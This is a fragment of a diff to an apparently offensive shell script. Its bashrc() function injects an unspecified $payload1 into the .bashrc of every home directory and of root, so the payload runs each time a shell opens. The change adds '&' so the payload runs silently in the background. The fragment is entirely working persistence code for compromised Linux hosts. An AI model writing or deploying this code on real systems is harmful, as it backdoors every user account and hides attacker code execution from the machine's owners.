@@ -43,10 +43,10 @@ clone(){
 bashrc(){
     bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
     for i in $bashrc; do
-        sed -is "30 a $payload1" $i
+        sed -is "30 a $payload1 &" $i
     done
 
-    sed -i "30 a $payload1" /root/.bashrc
+    sed -i "30 a $payload1 &" /root/.bashrc
 }
 
 # Need persistent alias. Right now, this doesn't do anything 
